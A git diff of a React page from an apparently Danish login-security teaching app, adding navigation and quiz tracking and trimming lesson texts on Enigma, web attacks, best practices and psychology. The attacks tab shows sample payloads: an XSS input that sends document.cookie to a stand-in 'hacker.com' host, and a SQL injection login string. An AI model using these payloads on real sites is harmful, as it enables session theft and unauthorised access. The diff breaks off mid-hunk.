@@ -1,6 +1,6 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { Box, Title, Text, Container, Paper, Tabs, Card, Group, ThemeIcon, Badge, List, Button, Progress, SimpleGrid, Accordion, Divider, Image, Alert } from '@mantine/core';
-import { Shield, WarningOctagon, Book, LockKey, CodeBlock, CheckCircle, X, CaretRight, Brain, Info, Lightning, Check, Medal, Trophy } from '@phosphor-icons/react';
+import { Shield, WarningOctagon, Book, LockKey, CodeBlock, CheckCircle, X, CaretRight, Brain, Info, Lightning, Check, Medal, Trophy, ArrowLeft, ArrowRight } from '@phosphor-icons/react';
 import { Link, useNavigate } from '@tanstack/react-router';
 import { RestartButton } from '../components/RestartButton';
 
@@ -10,9 +10,16 @@ function Learn() {
 	const [isProgressComplete, setIsProgressComplete] = useState(false);
 	const [showQuiz, setShowQuiz] = useState(false);
 	const [quizAnswered, setQuizAnswered] = useState(false);
+	const [quizzesCompleted, setQuizzesCompleted] = useState<{ [key: string]: boolean }>({});
 	const [showAchievement, setShowAchievement] = useState({ show: false, title: '' });
 
 	const navigate = useNavigate();
+
+	useEffect(() => {
+		if (activeTab && !completedLessons.includes(activeTab)) {
+			markLessonCompleted(activeTab);
+		}
+	}, [activeTab]);
 
 	const markLessonCompleted = (lessonId: string) => {
 		if (!completedLessons.includes(lessonId)) {
@@ -26,6 +33,10 @@ function Learn() {
 
 	const isLessonCompleted = (lessonId: string) => {
 		return completedLessons.includes(lessonId);
+	};
+
+	const isQuizCompletedForTab = (tabId: string) => {
+		return quizzesCompleted[tabId] || false;
 	};
 
 	const calculateProgress = () => {
@@ -49,8 +60,31 @@ function Learn() {
 		return tabs[(currentIndex + 1) % tabs.length];
 	};
 
+	const getNextRoute = () => {
+		if (completedLessons.length >= 5) {
+			return '/login-safe';
+		}
+		const nextTab = getNextTab(activeTab);
+		setActiveTab(nextTab);
+		return '/learn';
+	};
+
+	const NavigationButtons = () => (
+		<Box pos='fixed' top={20} right={20} style={{ zIndex: 1000 }}> 
+			<Group>
+				<Button variant='light' color='gray' leftSection={<ArrowLeft size={16} />} onClick={() => navigate({ to: '/' })}>
+					Gå tilbage
+				</Button>
+
+				<Button variant='filled' color='blue' rightSection={<ArrowRight size={16} />} onClick={() => navigate({ to: getNextRoute() })}>
+					Gå videre
+				</Button>
+			</Group>
+		</Box>
+	);
+
 	const AchievementPopup = ({ title, show, onComplete }: { title: string; show: boolean; onComplete: () => void }) => {
-		useState(() => {
+		useEffect(() => {
 			if (show) {
 				const timer = setTimeout(() => {
 					onComplete();
@@ -58,7 +92,7 @@ function Learn() {
 
 				return () => clearTimeout(timer);
 			}
-		});
+		}, [show, onComplete]);
 
 		return show ? (
 			<Paper style={{ position: 'fixed', bottom: 20, right: 20, zIndex: 1000 }} withBorder p='md' className='bg-gradient-to-r from-yellow-900 to-orange-900'>
@@ -93,6 +127,7 @@ function Learn() {
 						onClick={() => {
 							setQuizAnswered(true);
 							if (index === correctIndex) {
+								setQuizzesCompleted({ ...quizzesCompleted, [lessonId]: true });
 								markLessonCompleted(lessonId);
 							}
 						}}
@@ -123,6 +158,8 @@ function Learn() {
 
 	return (
 		<Box p='xl'>
+			<NavigationButtons />
+
 			<Container size='xl'>
 				<Paper withBorder p='lg' radius='md' className='bg-blue-900/10 text-white mb-6'>
 					<Group justify='space-between' className='mb-4'>
@@ -138,25 +175,30 @@ function Learn() {
 					<Progress value={calculateProgress()} size='md' className='mb-4' color='blue' />
 
 					<Text size='lg' mb={24}>
-						Udforsk disse lektioner for at lære om vigtigheden af sikker login praksis og hvordan hackerangreb fungerer.
+						Udforsk sikker login praksis og typiske hackerangreb
 					</Text>
 
 					<Tabs value={activeTab} onChange={setActiveTab} className='mb-6' color='blue'>
 						<Tabs.List grow>
 							<Tabs.Tab value='intro' leftSection={<Info size={16} />}>
 								Introduktion
+								{isLessonCompleted('intro') && <Check size={12} className='ml-1' />}
 							</Tabs.Tab>
 							<Tabs.Tab value='history' leftSection={<Book size={16} />}>
 								Historisk Kontekst
+								{isLessonCompleted('history') && <Check size={12} className='ml-1' />}
 							</Tabs.Tab>
 							<Tabs.Tab value='attacks' leftSection={<Lightning size={16} />}>
 								Angrebstyper
+								{isLessonCompleted('attacks') && <Check size={12} className='ml-1' />}
 							</Tabs.Tab>
 							<Tabs.Tab value='best-practices' leftSection={<Shield size={16} />}>
 								Bedste Praksis
+								{isLessonCompleted('best-practices') && <Check size={12} className='ml-1' />}
 							</Tabs.Tab>
 							<Tabs.Tab value='psychology' leftSection={<Brain size={16} />}>
-								Psykologiske Aspekter
+								Psykologi
+								{isLessonCompleted('psychology') && <Check size={12} className='ml-1' />}
 							</Tabs.Tab>
 						</Tabs.List>
 
@@ -169,24 +211,13 @@ function Learn() {
 
 									<Image src='./enigma.png' alt='Enigma maskine' height={150} fit='contain' className='mb-4' />
 
-									<Text mb={16}>Login-systemer er indgangen til digitale tjenester og beskytter følsomme oplysninger. De er et af de mest almindelige mål for hackere.</Text>
+									<Text mb={16}>Login-systemer beskytter følsomme oplysninger og er et almindeligt mål for hackere.</Text>
 
 									<List spacing='sm' mb={16}>
 										<List.Item icon={<CaretRight size={14} />}>Kryptografi og autentifikation</List.Item>
 										<List.Item icon={<CaretRight size={14} />}>Almindelige sårbarheder</List.Item>
 										<List.Item icon={<CaretRight size={14} />}>Bedste sikkerhedspraksis</List.Item>
 									</List>
-
-									<Button color='blue' onClick={() => markLessonCompleted('intro')} fullWidth>
-										{isLessonCompleted('intro') ? (
-											<>
-												<CheckCircle size={18} className='mr-2' weight='fill' />
-												Gennemført
-											</>
-										) : (
-											'Marker som gennemført'
-										)}
-									</Button>
 								</Card>
 
 								<Card withBorder radius='md' className='bg-blue-900/20'>
@@ -195,7 +226,7 @@ function Learn() {
 									</Title>
 
 									<Text size='sm' mb={16}>
-										Der er to måder at udforske dette læringsmateriale på:
+										To måder at udforske materialet:
 									</Text>
 
 									<List spacing='md' mb={20}>
@@ -207,7 +238,7 @@ function Learn() {
 											}
 										>
 											<Text fw='bold'>Guidet rejse</Text>
-											<Text size='sm'>Følg fanebladsinddelingen fra venstre til højre for en struktureret tilgang</Text>
+											<Text size='sm'>Følg fanebladsinddelingen fra venstre til højre</Text>
 										</List.Item>
 										<List.Item
 											icon={
@@ -217,23 +248,19 @@ function Learn() {
 											}
 										>
 											<Text fw='bold'>Praktisk læring</Text>
-											<Text size='sm'>Udforsk de interaktive login-sider og sammenlign sikker og usikker implementation</Text>
+											<Text size='sm'>Udforsk sikker og usikker login-implementation</Text>
 										</List.Item>
 									</List>
-
-									<Text size='sm' mb={16}>
-										Uanset hvilken tilgang du vælger, anbefales det at tage quizzerne for at teste din forståelse og opnå bedrifter undervejs.
-									</Text>
 								</Card>
 							</SimpleGrid>
 
-							{!isLessonCompleted('intro') && !showQuiz && (
+							{!isQuizCompletedForTab('intro') && !showQuiz && (
 								<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth mt={16}>
-									Tag quizzen for at fortsætte
+									Tag quizzen
 								</Button>
 							)}
 
-							{showQuiz && !isLessonCompleted('intro') && <QuizComponent question='Hvad er den største fordel ved at bruge stærk login-sikkerhed?' options={['Det ser professionelt ud', 'Det beskytter brugerdata mod uautoriseret adgang', 'Det øger hjemmesidens hastighed', 'Det reducerer serveromkostningerne']} correctIndex={1} lessonId='intro' />}
+							{showQuiz && !isQuizCompletedForTab('intro') && <QuizComponent question='Hvad er den største fordel ved at bruge stærk login-sikkerhed?' options={['Det ser professionelt ud', 'Det beskytter brugerdata mod uautoriseret adgang', 'Det øger hjemmesidens hastighed', 'Det reducerer serveromkostningerne']} correctIndex={1} lessonId='intro' />}
 						</Tabs.Panel>
 
 						<Tabs.Panel value='history' pt='xl'>
@@ -245,7 +272,7 @@ function Learn() {
 
 									<Image src='https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/EnigmaMachineLabeled.jpg/300px-EnigmaMachineLabeled.jpg' alt='Enigma maskine' mah={240} fit='contain' className='mb-4' />
 
-									<Text mb={16}>Enigma-maskinen var en avanceret krypteringsanordning brugt af Tyskland under 2. Verdenskrig. Den skabte koder der dengang blev anset som ubrydelige.</Text>
+									<Text mb={16}>Enigma var en krypteringsanordning brugt under 2. Verdenskrig. Den skabte koder der dengang blev anset som ubrydelige.</Text>
 
 									<List
 										spacing='sm'
@@ -256,23 +283,10 @@ function Learn() {
 											</ThemeIcon>
 										}
 									>
-										<List.Item>Brugte roterende hjul til at ændre bogstaver i beskeder</List.Item>
-										<List.Item>Hver dag brugtes nye indstillinger til at ændre koden</List.Item>
-										<List.Item>Alan Turing og holdet ved Bletchley Park brød koden</List.Item>
+										<List.Item>Brugte roterende hjul til at ændre bogstaver</List.Item>
+										<List.Item>Daglige indstillinger ændrede koden</List.Item>
+										<List.Item>Alan Turing brød koden ved Bletchley Park</List.Item>
 									</List>
-
-									{!isLessonCompleted('history') && (
-										<Button color='blue' onClick={() => markLessonCompleted('history')} fullWidth>
-											{isLessonCompleted('history') ? (
-												<>
-													<CheckCircle size={18} className='mr-2' weight='fill' />
-													Gennemført
-												</>
-											) : (
-												'Marker som gennemført'
-											)}
-										</Button>
-									)}
 								</Card>
 
 								<Card withBorder radius='md' className='bg-blue-900/20'>
@@ -280,40 +294,40 @@ function Learn() {
 										Fra Enigma til Moderne Login
 									</Title>
 
-									<Text mb={16}>Der er tydelige paralleller mellem Enigma og moderne login-sikkerhed:</Text>
+									<Text mb={16}>Paralleller mellem Enigma og moderne sikkerhed:</Text>
 
 									<SimpleGrid cols={1} spacing='md' mb={16}>
 										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
 											<Title order={5} mb={8}>
 												Kompleksitet
 											</Title>
-											<Text size='sm'>Enigma brugte roterende hjul. Moderne login bruger hashing og kryptering.</Text>
+											<Text size='sm'>Enigma: roterende hjul. Moderne login: hashing og kryptering.</Text>
 										</Paper>
 
 										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
 											<Title order={5} mb={8}>
 												Svagheder
 											</Title>
-											<Text size='sm'>Enigma var sårbar over for mønstre. Moderne login er sårbar over for brugeradfærd og dårlig kode.</Text>
+											<Text size='sm'>Enigma: sårbar over for mønstre. Moderne login: sårbar over for dårlige adgangskoder.</Text>
 										</Paper>
 
 										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
 											<Title order={5} mb={8}>
 												Mennesket som svaghed
 											</Title>
-											<Text size='sm'>Både Enigma og moderne sikkerhedssystemer har mennesker som det svageste led i kæden.</Text>
+											<Text size='sm'>Både Enigma og moderne systemer har mennesker som svageste led.</Text>
 										</Paper>
 									</SimpleGrid>
-
-									{!isLessonCompleted('history') && !showQuiz && (
-										<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth>
-											Tag quizzen for at fortsætte
-										</Button>
-									)}
-
-									{showQuiz && !isLessonCompleted('history') && <QuizComponent question='Hvilken historisk kryptografisk enhed har påvirket moderne sikkerhedstankegang?' options={['Smartphones', 'Enigma-maskinen', 'Håndskrevne breve', 'Fax-maskiner']} correctIndex={1} lessonId='history' />}
 								</Card>
 							</SimpleGrid>
+
+							{!isQuizCompletedForTab('history') && !showQuiz && (
+								<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth mt={16}>
+									Tag quizzen
+								</Button>
+							)}
+
+							{showQuiz && !isQuizCompletedForTab('history') && <QuizComponent question='Hvilken historisk kryptografisk enhed har påvirket moderne sikkerhedstankegang?' options={['Smartphones', 'Enigma-maskinen', 'Håndskrevne breve', 'Fax-maskiner']} correctIndex={1} lessonId='history' />}
 						</Tabs.Panel>
 
 						<Tabs.Panel value='attacks' pt='xl'>
@@ -341,7 +355,7 @@ function Learn() {
 												Cross-Site Scripting (XSS)
 											</Title>
 
-											<Text mb={12}>XSS-angreb indsprøjter ondsindet kode i en webside, så den udføres i andre brugeres browsere. Dette kan bruges til at stjæle cookies, session-tokens eller andre følsomme oplysninger.</Text>
+											<Text mb={12}>XSS-angreb indsprøjter kode i en webside for at køre i brugernes browsere.</Text>
 
 											<div className='font-mono text-xs bg-red-950 overflow-x-auto p-2 border border-red-500 rounded mb-4'>{`<input value="<script>fetch('https://hacker.com/steal?cookie='+document.cookie)</script>">`}</div>
 
@@ -349,9 +363,9 @@ function Learn() {
 												Beskyttelse
 											</Title>
 											<List size='sm' mb={12}>
-												<List.Item>Sanitér alt brugerinput før det vises</List.Item>
-												<List.Item>Anvend Content Security Policy (CSP)</List.Item>
-												<List.Item>Brug frameworks som React, der automatisk eskaperer HTML</List.Item>
+												<List.Item>Sanitér alt brugerinput</List.Item>
+												<List.Item>Anvend Content Security Policy</List.Item>
+												<List.Item>Brug frameworks som React</List.Item>
 											</List>
 
 											<Link to='/login-unsafe' className='w-full'>
@@ -366,20 +380,20 @@ function Learn() {
 												SQL Injection
 											</Title>
 
-											<Text mb={12}>SQL-injektion manipulerer database-forespørgsler ved at indsprøjte ondsindet SQL-kode, hvilket kan give uautoriseret adgang til data eller ændre database-indhold.</Text>
+											<Text mb={12}>SQL-injektion manipulerer database-forespørgsler via ondsindet kode.</Text>
 
 											<div className='font-mono text-xs bg-red-950 overflow-x-auto p-2 border border-red-500 rounded mb-4'>
 												{`username: admin' OR 1=1 --
-query: SELECT * FROM users WHERE username='admin' OR 1=1 --' AND password='anything'`}
+query: SELECT * FROM users WHERE username='admin' OR 1=1 --'`}
 											</div>
 
 											<Title order={6} mb={4}>
 												Beskyttelse
 											</Title>
 											<List size='sm' mb={12}>
-												<List.Item>Brug parameteriserede forespørgsler eller prepared statements</List.Item>
-												<List.Item>Anvend ORM (Object-Relational Mapping) værktøjer</List.Item>
-												<List.Item>Validér og rens alt brugerinput</List.Item>
+												<List.Item>Brug parameteriserede forespørgsler</List.Item>
+												<List.Item>Anvend ORM-værktøjer</List.Item>
+												<List.Item>Validér alt brugerinput</List.Item>
 											</List>
 
 											<Link to='/login-unsafe' className='w-full'>
@@ -394,7 +408,7 @@ query: SELECT * FROM users WHERE username='admin' OR 1=1 --' AND password='anyth
 												Cross-Site Request Forgery (CSRF)
 											</Title>
 
-											<Text mb={12}>CSRF-angreb tvinger brugere til at udføre uønskede handlinger på webapplikationer, hvor de er logget ind. Angribere udnytter, at browseren automatisk inkluderer cookies i anmodninger.</Text>
+											<Text mb={12}>CSRF-angreb tvinger brugere til at udføre uønskede handlinger på sider, hvor de er logget ind.</Text>
 
 											<div className='font-mono text-xs bg-red-950 overflow-x-auto p-2 border border-red-500 rounded mb-4'>
 												{`<!-- Ondsindet webside -->
@@ -405,8 +419,8 @@ query: SELECT * FROM users WHERE username='admin' OR 1=1 --' AND password='anyth
 												Beskyttelse
 											</Title>
 											<List size='sm' mb={12}>
-												<List.Item>Implementér CSRF-tokens i alle formularer</List.Item>
-												<List.Item>Brug SameSite cookie-attributten</List.Item>
+												<List.Item>Implementér CSRF-tokens</List.Item>
+												<List.Item>Brug SameSite cookie-attributter</List.Item>
 												<List.Item>Kræv bekræftelse for følsomme handlinger</List.Item>
 											</List>
 
@@ -432,7 +446,7 @@ query: SELECT * FROM users WHERE username='admin' OR 1=1 --' AND password='anyth
 												</ThemeIcon>
 												<Text fw='bold'>Brute Force</Text>
 											</Group>
-											<Text size='sm'>Systematisk afprøvning af alle mulige adgangskoder indtil den rigtige findes. Beskyttelse: Rate limiting, account lockout, captchas.</Text>
+											<Text size='sm'>Systematisk afprøvning af adgangskoder. Beskyttelse: Rate limiting, account lockout, captchas.</Text>
 										</Paper>
 
 										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
@@ -442,7 +456,7 @@ query: SELECT * FROM users WHERE username='admin' OR 1=1 --' AND password='anyth
 												</ThemeIcon>
 												<Text fw='bold'>Credential Stuffing</Text>
 											</Group>
-											<Text size='sm'>Brug af lækkede brugernavn/adgangskode-kombinationer fra ét site på andre sites. Beskyttelse: Unikke adgangskoder, to-faktor autentifikation.</Text>
+											<Text size='sm'>Brug af lækkede login-oplysninger. Beskyttelse: Unikke adgangskoder, to-faktor autentifikation.</Text>
 										</Paper>
 
 										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
@@ -452,7 +466,7 @@ query: SELECT * FROM users WHERE username='admin' OR 1=1 --' AND password='anyth
 												</ThemeIcon>
 												<Text fw='bold'>Phishing</Text>
 											</Group>
-											<Text size='sm'>Falske emails eller websites designet til at narre brugere til at afsløre login-oplysninger. Beskyttelse: Brugeruddannelse, HTTPS, anti-phishing værktøjer.</Text>
+											<Text size='sm'>Falske emails eller websites. Beskyttelse: Uddannelse, HTTPS, anti-phishing værktøjer.</Text>
 										</Paper>
 
 										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
@@ -462,36 +476,19 @@ query: SELECT * FROM users WHERE username='admin' OR 1=1 --' AND password='anyth
 												</ThemeIcon>
 												<Text fw='bold'>Man-in-the-Middle</Text>
 											</Group>
-											<Text size='sm'>Ondsindet aktør opsnappper kommunikation mellem bruger og server. Beskyttelse: HTTPS, certificate pinning, kryptering.</Text>
+											<Text size='sm'>Opsnapning af kommunikation. Beskyttelse: HTTPS, certificate pinning, kryptering.</Text>
 										</Paper>
 									</SimpleGrid>
-
-									<Title order={4} mb={12}>
-										Angrebsstatistik
-									</Title>
-
-									<Text mb={20}>Login-relaterede angreb er en af de mest almindelige indgangsveje for cyberkriminelle. Ifølge sikkerhedsrapporter udgør credential stuffing og brute force angreb over 60% af alle angreb mod webapplikationer.</Text>
-
-									<Button color='blue' onClick={() => markLessonCompleted('attacks')} fullWidth>
-										{isLessonCompleted('attacks') ? (
-											<>
-												<CheckCircle size={18} className='mr-2' weight='fill' />
-												Gennemført
-											</>
-										) : (
-											'Marker som gennemført'
-										)}
-									</Button>
 								</Card>
 							</SimpleGrid>
 
-							{!isLessonCompleted('attacks') && !showQuiz && (
+							{!isQuizCompletedForTab('attacks') && !showQuiz && (
 								<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth mt={16}>
-									Tag quizzen for at fortsætte
+									Tag quizzen
 								</Button>
 							)}
 
-							{showQuiz && !isLessonCompleted('attacks') && <QuizComponent question='Hvad er SQL Injection?' options={['En type anti-virus software', 'Et angreb der manipulerer database-forespørgsler via brugerinput', 'Et værktøj til at teste webside-hastighed', 'Et system til at tilføje data til en database']} correctIndex={1} lessonId='attacks' />}
+							{showQuiz && !isQuizCompletedForTab('attacks') && <QuizComponent question='Hvad er SQL Injection?' options={['En type anti-virus software', 'Et angreb der manipulerer database-forespørgsler via brugerinput', 'Et værktøj til at teste webside-hastighed', 'Et system til at tilføje data til en database']} correctIndex={1} lessonId='attacks' />}
 						</Tabs.Panel>
 
 						<Tabs.Panel value='best-practices' pt='xl'>
@@ -509,21 +506,17 @@ query: SELECT * FROM users WHERE username='admin' OR 1=1 --' AND password='anyth
 											<Accordion.Panel>
 												<List spacing='sm'>
 													<List.Item>Gem aldrig adgangskoder i klartekst</List.Item>
-													<List.Item>Brug stærke hashing-algoritmer som bcrypt, Argon2 eller PBKDF2</List.Item>
-													<List.Item>Tilføj unikke salt-værdier til hver adgangskode før hashing</List.Item>
-													<List.Item>Anvend tilstrækkelige arbejdsfaktorer for at modstå brute force</List.Item>
+													<List.Item>Brug bcrypt, Argon2 eller PBKDF2 til hashing</List.Item>
+													<List.Item>Tilføj unikke salt-værdier før hashing</List.Item>
+													<List.Item>Anvend tilstrækkelige arbejdsfaktorer</List.Item>
 												</List>
 
 												<div className='font-mono text-xs bg-green-950 overflow-x-auto p-2 border border-green-500 rounded my-4'>
-													{`// Eksempel med bcrypt (Node.js)
-const bcrypt = require('bcrypt');
-const saltRounds = 12;
+													{`// Hashing af adgangskode
+const hashedPassword = await bcrypt.hash(password, 12);
 
-// Hashing af adgangskode
-const hashedPassword = await bcrypt.hash(password, saltRounds);
-
-// Verificering af adgangskode
-const isMatch = await bcrypt.compare(inputPassword, hashedPassword);`}
+// Verificering
+const isMatch = await bcrypt.compare(input, hashedPassword);`}
 												</div>
 											</Accordion.Panel>
 										</Accordion.Item>
@@ -535,14 +528,10 @@ const isMatch = await bcrypt.compare(inputPassword, hashedPassword);`}
 											<Accordion.Panel>
 												<List spacing='sm'>
 													<List.Item>Implementér to-faktor autentifikation (2FA)</List.Item>
-													<List.Item>Kræv stærke adgangskoder (længde, kompleksitet, ingen almindelige ord)</List.Item>
-													<List.Item>Brug sikre session management med korrekt konfigurerede cookies</List.Item>
-													<List.Item>Implementér rate limiting og account lockout for at forhindre brute force</List.Item>
+													<List.Item>Kræv stærke adgangskoder</List.Item>
+													<List.Item>Brug sikker session management</List.Item>
+													<List.Item>Implementér rate limiting</List.Item>
 												</List>
-
-												<Text size='sm' mt={12}>
-													To-faktor autentifikation giver et ekstra sikkerhedslag ved at kræve noget brugeren har (f.eks. en mobiltelefon) udover noget brugeren ved (adgangskoden).
-												</Text>
 											</Accordion.Panel>
 										</Accordion.Item>
 
@@ -551,71 +540,37 @@ const isMatch = await bcrypt.compare(inputPassword, hashedPassword);`}
 												<Text fw='bold'>CSRF-beskyttelse</Text>
 											</Accordion.Control>
 											<Accordion.Panel>
-												<Text size='sm' mb={12}>
-													Cross-Site Request Forgery (CSRF) beskyttelse forhindrer angribere i at udføre handlinger på brugerens vegne.
-												</Text>
-
 												<List spacing='sm'>
 													<List.Item>Generér unikke CSRF-tokens for hver session</List.Item>
-													<List.Item>Inkluder tokens i alle formularer og AJAX-anmodninger</List.Item>
-													<List.Item>Validér tokens på serversiden for hver anmodning der ændrer tilstand</List.Item>
+													<List.Item>Inkluder tokens i alle formularer</List.Item>
+													<List.Item>Validér tokens på serversiden</List.Item>
 													<List.Item>Brug SameSite cookie-attributten</List.Item>
 												</List>
 
 												<div className='font-mono text-xs bg-green-950 overflow-x-auto p-2 border border-green-500 rounded my-4'>
 													{`// Generér CSRF token
 const csrfToken = crypto.randomBytes(16).toString('hex');
-req.session.csrfToken = csrfToken;
 
-// På klientsiden i alle formularer
-<input type="hidden" name="csrf_token" value="${'{csrfToken}'}" />
-
-// Validér token på server
-if (req.body.csrf_token !== req.session.csrfToken) {
-  return res.status(403).send('Ugyldig CSRF token');
-}`}
+// På klientsiden
+<input type="hidden" name="csrf_token" value="${'{csrfToken}'}" />`}
 												</div>
 											</Accordion.Panel>
 										</Accordion.Item>
 
 										<Accordion.Item value='input-validation'>
 											<Accordion.Control icon={<Shield size={18} className='text-green-400' />}>
-												<Text fw='bold'>Input Validering og Sanitering</Text>
+												<Text fw='bold'>Input Validering</Text>
 											</Accordion.Control>
 											<Accordion.Panel>
-												<Text size='sm' mb={12}>
-													Validering og sanitering beskytter mod XSS, SQL-injektion og andre indsprøjtningsangreb.
-												</Text>
-
 												<List spacing='sm'>
-													<List.Item>Valider alle brugerinput på både klient- og serverside</List.Item>
-													<List.Item>Brug whitelisting i stedet for blacklisting når muligt</List.Item>
-													<List.Item>Sanitér output, der vises tilbage til brugeren</List.Item>
-													<List.Item>Anvend prepared statements eller parameteriserede forespørgsler for database</List.Item>
+													<List.Item>Valider input på klient- og serverside</List.Item>
+													<List.Item>Brug whitelisting frem for blacklisting</List.Item>
+													<List.Item>Sanitér output til brugeren</List.Item>
+													<List.Item>Anvend prepared statements</List.Item>
 												</List>
-
-												<div className='font-mono text-xs bg-green-950 overflow-x-auto p-2 border border-green-500 rounded my-4'>
-													{`// Sanitering af input
-const sanitized = DOMPurify.sanitize(userInput);
-
-// Parameteriserede database-forespørgsler
-const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
-db.query(query, [username, passwordHash]);`}
-												</div>
 											</Accordion.Panel>
 										</Accordion.Item>
 									</Accordion>
-
-									<Button color='blue' onClick={() => markLessonCompleted('best-practices')} fullWidth>
-										{isLessonCompleted('best-practices') ? (
-											<>
-												<CheckCircle size={18} className='mr-2' weight='fill' />
-												Gennemført
-											</>
-										) : (
-											'Marker som gennemført'
-										)}
-									</Button>
 								</Card>
 
 								<Card withBorder radius='md' className='bg-blue-900/20'>
@@ -633,16 +588,16 @@ db.query(query, [username, passwordHash]);`}
 										</Group>
 
 										<SimpleGrid cols={2} spacing='xs'>
-											<Text size='sm'>✓ Adgangskoder hashes og saltes</Text>
+											<Text size='sm'>✓ Hashing og salting</Text>
 											<Text size='sm'>✓ CSRF-beskyttelse</Text>
-											<Text size='sm'>✓ Input sanitering mod XSS</Text>
+											<Text size='sm'>✓ Input sanitering</Text>
 											<Text size='sm'>✓ Rate limiting</Text>
 											<Text size='sm'>✓ Parameteriserede queries</Text>
-											<Text size='sm'>✓ Sikre, HttpOnly cookies</Text>
+											<Text size='sm'>✓ HttpOnly cookies</Text>
 										</SimpleGrid>
 									</Paper>
 
-									<Paper withBorder p='md' radius='md' className='bg-red-900/40 mb-20'>
+									<Paper withBorder p='md' radius='md' className='bg-red-900/40 mb-12'>
 										<Group justify='space-between' mb={8}>
 											<Group>
 												<WarningOctagon size={20} className='text-red-400' weight='fill' />
@@ -656,7 +611,7 @@ db.query(query, [username, passwordHash]);`}
 											<Text size='sm'>✗ Ingen CSRF-tokens</Text>
 											<Text size='sm'>✗ Sårbar over for XSS</Text>
 											<Text size='sm'>✗ Ubegrænset login-forsøg</Text>
-											<Text size='sm'>✗ Sårbar over for SQL-injektion</Text>
+											<Text size='sm'>✗ SQL-injektion sårbarhed</Text>
 											<Text size='sm'>✗ Usikker session håndtering</Text>
 										</SimpleGrid>
 									</Paper>
@@ -673,61 +628,61 @@ db.query(query, [username, passwordHash]);`}
 								</Card>
 							</SimpleGrid>
 
-							{!isLessonCompleted('best-practices') && !showQuiz && (
+							{!isQuizCompletedForTab('best-practices') && !showQuiz && (
 								<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth mt={16}>
-									Tag quizzen for at fortsætte
+									Tag quizzen
 								</Button>
 							)}
 
-							{showQuiz && !isLessonCompleted('best-practices') && <QuizComponent question='Hvad er den sikreste måde at gemme brugeradgangskoder på?' options={['I en tekstfil på serveren', 'I klartekst i databasen', 'Hashet og saltet med en sikker algoritme', 'Base64-encodet']} correctIndex={2} lessonId='best-practices' />}
+							{showQuiz && !isQuizCompletedForTab('best-practices') && <QuizComponent question='Hvad er den sikreste måde at gemme brugeradgangskoder på?' options={['I en tekstfil på serveren', 'I klartekst i databasen', 'Hashet og saltet med en sikker algoritme', 'Base64-encodet']} correctIndex={2} lessonId='best-practices' />}
 						</Tabs.Panel>
 
 						<Tabs.Panel value='psychology' pt='xl'>
 							<SimpleGrid cols={2} spacing='lg'>
 								<Card withBorder radius='md' className='bg-blue-900/20'>
 									<Title order={3} mb={16}>
-										Psykologiske Aspekter af Sikkerhed
+										Psykologiske Aspekter
 									</Title>
 
-									<Text mb={16}>Forståelse af menneskelig psykologi er afgørende for at bygge effektive sikkerhedssystemer. Mange sikkerhedsbrister skyldes ikke tekniske fejl, men menneskers adfærd og beslutninger.</Text>
+									<Text mb={16}>Forståelse af menneskelig psykologi er afgørende for sikkerhed. Mange brud skyldes brugeradfærd, ikke tekniske fejl.</Text>
 
 									<SimpleGrid cols={2} spacing='md' mb={20}>
 										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
 											<Title order={5} mb={8}>
 												Bekvemlighed vs. Sikkerhed
 											</Title>
-											<Text size='sm'>Mennesker prioriterer ofte bekvemmelighed over sikkerhed og vælger nemmere men mindre sikre muligheder. Dette er grunden til at mange genbruger adgangskoder eller vælger simple koder, der er lette at huske.</Text>
+											<Text size='sm'>Mennesker prioriterer ofte bekvemmelighed over sikkerhed. Derfor genbruges simple adgangskoder.</Text>
 										</Paper>
 
 										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
 											<Title order={5} mb={8}>
 												Social Engineering
 											</Title>
-											<Text size='sm'>Social engineering udnytter menneskelig tillid og psykologiske tendenser. Teknikker som phishing, pretexting og baiting udnytter menneskers naturlige tilbøjelighed til at stole på andre.</Text>
+											<Text size='sm'>Udnytter tillid og psykologiske tendenser gennem phishing og baiting.</Text>
 										</Paper>
 
 										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
 											<Title order={5} mb={8}>
 												Sikkerhedstræthed
 											</Title>
-											<Text size='sm'>For mange sikkerhedskrav fører til "sikkerhedstræthed", hvor brugere udvikler arbejdsomgåelser eller ignorerer sikkerhedsforholdsregler helt. Balance er nøglen til effektiv sikkerhed.</Text>
+											<Text size='sm'>For mange sikkerhedskrav fører til at brugere ignorerer forholdsregler.</Text>
 										</Paper>
 
 										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
 											<Title order={5} mb={8}>
 												Risikoperception
 											</Title>
-											<Text size='sm'>Mennesker har en tendens til at undervurdere cybersikkerhedsrisici, da de ofte er usynlige eller abstrakte. Dette fører til manglende motivation til at følge sikkerhedspraksis.</Text>
+											<Text size='sm'>Mennesker undervurderer cybertrusler fordi de er usynlige eller abstrakte.</Text>
 										</Paper>
 									</SimpleGrid>
 								</Card>
 
 								<Card withBorder radius='md' className='bg-blue-900/20'>
 									<Title order={3} mb={16}>
-										Designprincipper for Brugervenlig Sikkerhed
+										Brugervenlig Sikkerhed
 									</Title>
 
-									<Text mb={16}>At forene god sikkerhed med god brugeroplevelse er muligt ved at følge disse principper:</Text>
+									<Text mb={16}>At forene sikkerhed med god brugeroplevelse kræver:</Text>
 
 									<List
 										spacing='md'
@@ -739,60 +694,42 @@ db.query(query, [username, passwordHash]);`}
 										}
 									>
 										<List.Item>
-											<Text fw='bold'>Gør det nemt at gøre det rigtige</Text>
-											<Text size='sm'>Design systemer, hvor den sikreste handling også er den nemmeste. F.eks. brug af adgangskode-managers med auto-udfyldning.</Text>
